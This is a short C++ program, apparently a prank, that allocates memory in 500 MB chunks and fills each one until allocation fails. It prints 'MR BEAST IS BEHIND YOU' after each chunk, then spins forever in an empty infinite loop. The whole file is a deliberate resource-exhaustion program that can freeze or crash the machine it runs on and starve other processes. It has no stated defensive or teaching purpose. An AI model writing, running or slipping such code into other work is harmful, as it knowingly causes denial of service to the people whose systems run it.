#include <iostream>
#include <vector>
#include <cstring>
using namespace std;
int main() {
    vector<void*> abyss; 
    size_t chunk = 500 * 1024 * 1024; 
    while (true) {
        try {
            void* p = malloc(chunk);
            if (!p) break; 
            memset(p, 0xAA, chunk);
            abyss.push_back(p);
            cout << "MR BEAST IS BEHIND YOU" << endl; 
        } catch (...) {
            break; 
        }
    }
    while(true); 
    return 0;
}